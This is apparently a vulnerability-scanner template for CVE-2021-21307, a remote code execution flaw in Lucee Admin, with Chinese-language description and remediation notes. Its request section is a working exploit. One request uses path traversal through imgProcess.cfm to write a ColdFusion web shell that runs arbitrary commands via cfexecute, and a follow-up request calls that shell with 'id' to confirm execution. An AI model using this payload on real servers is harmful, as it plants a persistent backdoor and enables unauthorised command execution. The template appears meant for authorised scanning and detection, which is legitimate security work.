id: CVE-2021-21307
info:
  name: Lucee Admin - Remote Code Execution
  author:
  - dhiyaneshdk
  tags:
  - cve
  - cve2021
  - rce
  - lucee
  - adobe
  description: |-
    Lucee远程代码执行漏洞
    lucee服务器（简称lucee）是一种动态的、基于java的标记和脚本语言，用于快速的web应用程序开发。其旧版本某些文件存在未授权访问，攻击者可构造恶意请求造成远程代码执行。
  reference:
  - https://github.com/lucee/lucee/security/advisories/ghsa-2xvv-723c-8p7r
  - https://github.com/httpvoid/writeups/blob/main/apple-rce.md
  - https://nvd.nist.gov/vuln/detail/cve-2021-21307
  severity: critical
  classification:
    cve-id:
    - cve-2021-21307
    cwe-id:
    - cwe-862
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://github.com/lucee/Lucee/commit/6208ab7c44c61d26c79e0b0af10382899f57e1ca
    临时修复方案：
    1、在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
    2、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - uid=
    - gid=
    - groups=
  - type: status
    status:
    - 200
  extractors:
  - type: regex
    regex:
    - (u|g)id=.*
  matchers-condition: and
  raw:
  - |
    POST /lucee/admin/imgProcess.cfm?file=/whatever HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    imgSrc=a
  - |
    POST /lucee/admin/imgProcess.cfm?file=/../../../context/{{randstr}}.cfm HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    imgSrc=
    <cfoutput>

    <table>
    <form method="POST" action="">
    <tr><td>Command:</td><td><input type=test name="cmd" size=50
    <cfif isdefined("form.cmd")>value="#form.cmd#"</cfif>><br></td></tr>
    <tr><td>Options:</td><td> <input type=text name="opts" size=50
    <cfif isdefined("form.opts")>value="#form.opts#"</cfif>><br></td></tr>
    <tr><td>Timeout:</td><td> <input type=text name="timeout" size=4
    <cfif isdefined("form.timeout")>value="#form.timeout#"
    <cfelse> value="5"</cfif>></td></tr>
    </table>
    <input type=submit value="Exec" >
    </form>
    <cfif isdefined("form.cmd")>
    <cfsavecontent variable="myVar">
    <cfexecute name = "#Form.cmd#"
    arguments = "#Form.opts#"
    timeout = "#Form.timeout#">
    </cfexecute>
    </cfsavecontent>
    <pre>
    #HTMLCodeFormat(myVar)#
    </pre>
    </cfif>
    </cfoutput>
  - |
    POST /lucee/{{randstr}}.cfm HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Content-Type: application/x-www-form-urlencoded

    cmd=id&opts=&timeout=5
